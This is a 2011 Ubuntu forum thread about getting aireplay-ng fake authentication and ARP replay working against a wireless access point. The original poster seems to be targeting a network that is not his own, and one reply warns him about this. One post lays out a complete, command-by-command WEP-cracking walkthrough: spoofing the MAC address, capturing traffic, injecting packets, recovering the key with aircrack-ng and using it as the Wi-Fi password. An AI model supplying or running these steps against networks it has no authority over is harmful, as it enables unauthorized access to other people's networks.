---
title: "Problem with aireplay-ng"
date: 2011-10-26
forum: New to Ubuntu
---

### Post by appolons on 2011-10-26
i try to run 
aireplay-ng -1 0 mon1 -a 00:FE:F4:50:AF:**
 bu it give me back this
Waiting for beacon frame (BSSID: 00:FE:F4:50:AF:*8) on channel -1
18:17:48  mon0 is on channel -1, but the AP uses channel 11

Wifi card: **Intel Corporation Centrino Advanced-N 6200** Kernel : 3.0.0-12-generic
latest Ubuntu version 10.11
Driver: "iwlagn"

 I used this thread
[http://ubuntuforums.org/showpost.php...81&postcount=1]("http://ubuntuforums.org/showpost.php?p=9985581&postcount=1")
but still nothing 


Thanks!

---

### Post by fractalman on 2011-10-26
you need to set the channel of your wifi adapter/card first then try and use mon0 on the desired channel, in your case its channel 11 you need

check iwconfig and make sure only wlan0 is there, then stop the service


read this as either wlan0 or mon0  not both

```

sudo airmon-ng stop wlan0/mon0

```

$IFACE = your wifi interface (mine is wlan0 not sure bout yours)
channel $@ = your desired channel no (in your case you want channel 11)


```

sudo ifconfig $IFACE down
sudo iwconfig $IFACE mode managed
sudo ifconfig $IFACE up
sudo iwconfig $IFACE channel $@
sudo ifconfig $IFACE down
sudo iwconfig $IFACE mode monitor
sudo ifconfig $IFACE up


```start monitor mode on desired channel

```

sudo airmon-ng start mon0 11

```check with iwconfig for mon0

try that and see if it makes a difference :)

---

### Post by appolons on 2011-10-26
> **fractalman said:**
> you need to set the channel of your wifi adapter/card first then try and use mon0 on the desired channel, in your case its channel 11 you need

check iwconfig and make sure only wlan0 is there, then stop the service


read this as either wlan0 or mon0  not both

```

sudo airmon-ng stop wlan0/mon0

```$IFACE = your wifi interface (mine is wlan0 not sure bout yours)
channel $@ = your desired channel no (in your case you want channel 11)


```

sudo ifconfig $IFACE down
sudo iwconfig $IFACE mode managed
sudo ifconfig $IFACE up
sudo iwconfig $IFACE channel $@
sudo ifconfig $IFACE down
sudo iwconfig $IFACE mode monitor
sudo ifconfig $IFACE up


```start monitor mode on desired channel

```

sudo airmon-ng start mon0 11

```check with iwconfig for mon0

try that and see if it makes a difference :)

Thanks for help, looks like it works, FINALLY
only when i run comand :
aireplay-ng -1 0 wlan0 -a 00 : ** : ** : ** : ** : **
i only get 4 packets
may be you know how to run it so i get the packets all the time and more packets per second?

---

### Post by Dangertux on 2011-10-26
> **appolons said:**
> Thanks for help, looks like it works, FINALLY
only when i run comand :
aireplay-ng -1 0 wlan0 -a 00 : ** : ** : ** : ** : **
i only get 4 packets
may be you know how to run it so i get the packets all the time and more packets per second?

You used a fakeauth (-1) with option 0 -- this means fakeauth one time...

If you want to change packet timing you need to explore the -q option.

[http://www.aircrack-ng.org/doku.php?id=fake_authentication](http://www.aircrack-ng.org/doku.php?id=fake_authentication)

Are you sure you should be doing this?

---

### Post by appolons on 2011-10-26
> **Dangertux said:**
> You used a fakeauth (-1) with option 0 -- this means fakeauth one time...

If you want to change packet timing you need to explore the -q option.

[http://www.aircrack-ng.org/doku.php?id=fake_authentication](http://www.aircrack-ng.org/doku.php?id=fake_authentication)

Are you sure you should be doing this?

All looks good only not going well with ARP requests
Red 3101352 packets (got 0 ARP requests and 1132 ACKs), sent 0 packets...(0 pps)

---

### Post by Eiji Takanaka on 2011-11-02
p { margin-bottom: 0.21cm; }  Heres something i wrote earlier.... ;) 



Be good, some people are on limited bandwidth man ;)



Testing the security of a WEP enabled wi-fi network using a Linux based O/S..
 

 Acquire laptop/netbook with wi-fi card and suitable packet injection abilities......
 

 Acquire tools “macchanger” and “aircrack-ng” via “apt-get install” method...
 

 #Sudo apt-get install macchanger#
 #Sudo apt-get install aircrack-ng#
 

 Disable networking via network icon -  deselect “enable networking”
 

 Open Terminal - #sudo airmon-ng stop wlan0 (This temporarily stops your wi-fi card/drivers)
 

 #Sudo ifconfig wlan0 down (This temporarily stops your wi-fi network drivers\card)
 

 #Sudo macchanger –mac 00:11:22:33:44:55 wlan0 (This creates fake macaddress)
 

 #Sudo airmon-ng start wlan0 (This restarts your network card)
 

 #Sudo ifconfig wlan0 up (This step may not be required but I have included it anyways)
 

 #Sudo airodump-ng wlan0 (This will show a list of all available wi-fi networks in your area)
 

 Select the network you wish to test and make a note of its “channel no”. (e.g CH 7)  
 Copy the “bssid no” of the network in question. (e.g 00:55:44:33:22:11)
 

 Once you have the required details of the network terminate this “scanning process” with Ctrl C.
 

 Fresh terminal if you wish....
 

 #Sudo airodump-ng -c 7  -w wifi –bssid 00:55:44:33:22:11 wlan0 (This should either start to send or receive packets between computers) The results will be written to a file  in this instance “wi-fi”.
 

 Leave this process running and open a fresh terminal window...
 

 #Sudo aireplay-ng -1 0 -a 00:55:44:33:22:11 -h 00:11:22:33:44:55 wlan0 (at this point if all is going well you should see “association successful =-)” This is required in order for it to work.
 

 #Sudo aireplay-ng -3 -b 00:55:44:33:22:11 -h 00:11:22:33:44:55 wlan0 (this should cause it to start sending a series of packets to the destination network)
 

 Leave this process going for a bit, before continuing onto the next step...
 

 Open a new terminal....
 

 #aircrack-ng -b 00:55:44:33:22:11 wifi-01.cap
 

 If unsuccessful wait longer to collect more packets and try again..  
 

 Once hexidecimal key is decyphered, de-capitalise letters, remove colons and enter as wi-fi network password.

You have a dog and maybe just maybe his name is bingo. ;)

---

### Post by appolons on 2011-11-03
I will be carefull with bandwidth limite.

Only thing i need to know is how to get ARP request because after runing this line:

aireplay-ng -3 -b 00:55:44:33:22:11 -h 00:11:22:33:44:55 wlan0

its reading all the time and 0 send packets and 0 ARP

May be somebody know how to ping AP even if i dont know IP ???? :confused:
so i can get some ARP packet

---

